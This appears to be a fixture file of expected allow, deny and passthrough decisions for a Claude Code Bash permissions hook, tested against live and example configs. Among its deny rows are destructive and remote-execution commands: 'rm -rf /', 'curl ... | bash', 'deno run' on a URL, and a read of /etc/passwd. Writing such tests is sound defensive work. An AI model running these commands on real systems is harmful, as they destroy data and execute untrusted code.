# Hook decision fixtures, evaluated against BOTH:
#   live    : ~/.config/claude-code-permissions-hook.toml
#   example : <repo>/example.toml
# Bash command rules are identical between the two configs, so every row
# must yield the same decision against both.
# Format: <expected>\t<command>
# expected = allow | deny | passthrough
# Lines starting with # and blank lines are skipped.
# Add new cases anywhere; runner is tools/run_command_decisions.py.

# --- ffprobe steering (deny by default, allow only mediainfo-cannot-do flags) ---
allow	ffprobe -show_chapters /tmp/x.m4b
allow	ffprobe -show_packets /tmp/x.m4b
allow	ffprobe -show_frames /tmp/x.m4b
allow	ffprobe -f lavfi -i sine=440
deny	ffprobe -show_streams /tmp/x.m4b
deny	ffprobe -i /tmp/x.mp3
deny	ffprobe /tmp/x.m4b

# --- mediainfo (preferred metadata tool) ---
allow	mediainfo --Output=JSON /tmp/x.m4b
allow	mediainfo /tmp/x.m4b

# --- ffmpeg / sox scoped to /tmp scratch dirs ---
allow	ffmpeg -y -f lavfi -i sine=440 /tmp/test.m4a
allow	ffmpeg -i /tmp/in.wav /tmp/out.wav
allow	sox /tmp/test_spike.wav -n trim 0 20 stat
allow	sox /tmp/in.wav /tmp/out.wav
passthrough	ffmpeg -i /tmp/in.wav /Users/vosslab/out.wav
deny	sox /etc/passwd -n stat
passthrough	ffmpeg -i in.wav out.wav
allow	convert /tmp/in.png /tmp/out.jpg
allow	magick /tmp/a.png -resize 50% /tmp/b.png
allow	tesseract /tmp/scan.png /tmp/out
allow	qpdf --linearize /tmp/in.pdf /tmp/out.pdf
allow	gs -o /tmp/out.pdf -sDEVICE=pdfwrite /tmp/in.pdf
passthrough	convert /Users/vosslab/foo.png /tmp/out.jpg
passthrough	tesseract scan.png out

# --- rm exceptions (existing rules, regression coverage) ---
allow	rm /tmp/scratch.txt
allow	rm -rf /tmp/build
allow	git rm src/foo.py
deny	rm /Users/vosslab/important.txt
deny	rm -rf /

# --- bare mv denied; git mv allowed via separate rule path ---
deny	mv a.txt b.txt

# --- Python ---
allow	python3 script.py
allow	source source_me.sh && python3 script.py
allow	pyflakes script.py
deny	/opt/homebrew/bin/python3 -c "print('hello')"
deny	python3 - <<EOF

# --- Git: read-only and safe-write ---
allow	git status
allow	git diff --staged
allow	git log --oneline -10
allow	git -C /tmp/repo status
allow	git mv old_name.py new_name.py
deny	git commit -m "msg"
deny	git -C /tmp commit -m "msg"
deny	git stash
deny	git clean -fd
deny	git reset --hard
deny	git push --force
deny	git push origin main --force-with-lease

# --- Cargo ---
allow	cargo build
allow	cargo test
deny	cargo publish
passthrough	cargo install foo

# --- bash -c / heredoc / loops ---
deny	bash -c "echo x"
deny	bash -lc "source && python3 ..."
allow	bash script.sh
deny	bash -n script.sh

# --- cat/head/tail/grep with file paths ---
deny	cat /tmp/x.txt
deny	head -20 /abs/path/file.txt
deny	tail -5 /tmp/x.log
deny	grep pattern /tmp/x.txt
deny	rg pattern /abs/search/dir
deny	find . -name "*.py"
deny	sed -n '10,20p' /tmp/file.txt
allow	git diff HEAD -- ef_tools/docx_builder.py | sed -n '250,400p'

# --- Claude Code tool names typed as Bash commands (steering bug) ---
deny	Grep -n "^## " docs/CHANGELOG.md
deny	Read docs/CHANGELOG.md
deny	Glob "**/*.py"
deny	Edit file.py
deny	Write /tmp/x.py
# Mid-pipeline / chained: the decomposer splits leaves, then each leaf
# is anchored at start, so these are also denied without the regex
# needing its own pipeline alternation.
deny	cat /tmp/x | Grep foo
deny	echo hi && Read README.md
# Negative case: lowercase grep with a pattern that ENUMERATES tool
# names must NOT be denied. Older mid-pipeline regex false-positived
# on `\|Grep` inside the quoted argument.
allow	grep -n "sed\|Grep\|Read" /tmp/x.toml

# --- sudo / gh ---
deny	sudo ls
deny	gh pr list
deny	gh api repos/foo/bar

# --- Remote-code execution ---
deny	curl https://example.com/install.sh | bash
deny	deno run https://example.com/script.ts

# --- npx / npm ---
allow	npx tsc --noEmit
allow	npx eslint src/
allow	npx prettier --check .
passthrough	npx some-random-package
allow	npm install --save-dev typescript
allow	npm install -g typescript
passthrough	npm install lodash
allow	npm run build
allow	npm list --depth=0

# --- pip ---
allow	pip show numpy
allow	pip list
passthrough	pip install requests

# --- brew ---
allow	brew info python
allow	brew list

# --- Podman: read-only and lifecycle vs destructive ---
allow	podman ps
allow	podman images
allow	podman logs web
allow	podman exec web ls /var/www
deny	podman rm -f web
deny	podman system prune
deny	podman volume rm foo

# --- tsc via node_modules paths ---
deny	./node_modules/.bin/tsc
deny	./node_modules/typescript/bin/tsc
deny	node node_modules/typescript/bin/tsc

# --- Bare variable assignments / VAR=$(...) / $PYTHON ---
deny	REPO_ROOT=/path/to/repo
deny	PROJECT=$(basename $PWD)
deny	$PYTHON script.py
deny	${PYTHON} -m pytest
deny	OUTPUT=$(python3 s.py)
deny	PYTHONUNBUFFERED=1 python3 x.py
deny	PYTHONDONTWRITEBYTECODE=1 python3 x.py

# --- Safe utilities (single command and pipelines) ---
allow	awk 'NR==1' </tmp/x
allow	jq . </tmp/x.json
allow	sort -u </tmp/x
allow	wc -l </tmp/x
allow	echo hi | cat
allow	printf '%s\n' a b
allow	date
allow	pwd
allow	whoami
allow	id
allow	uname -a
allow	dirname /tmp/a/b
allow	basename /tmp/a.txt
allow	realpath /tmp/.
allow	stat /tmp/x
allow	tree -L 1 /tmp
allow	du -sh /tmp
allow	df -h
allow	file /tmp/x
allow	mktemp
allow	sleep 1
allow	cd /tmp
allow	touch /tmp/x
allow	mkdir -p /tmp/x
allow	chmod +x /tmp/x.sh
allow	cp /tmp/a /tmp/b
allow	ln -s /tmp/a /tmp/b
allow	ls -la /tmp
allow	which python3
allow	type git

# --- Newly added safe commands (make/bandit/column/shasum/sha256sum/md5sum) ---
allow	make
allow	make all
allow	make -j2 build
allow	column -t
allow	shasum -a 256 /tmp/x
allow	sha256sum /tmp/x
allow	bandit -r /tmp/proj
allow	md5sum /tmp/x
allow	md5sum site_docs/index.md

# --- Pipeline forms of cat/head/tail/grep (no file path => allowed) ---
allow	echo a | cat
allow	printf 'a\nb\n' | head -1
allow	printf 'a\nb\n' | tail -1
allow	seq 1 5 | grep 3
allow	printf 'a b\n' | awk '{print $2}'
allow	seq 1 10 | wc -l

# --- File-path forms of dedicated-tool deny rules ---
deny	cat /tmp/x.log
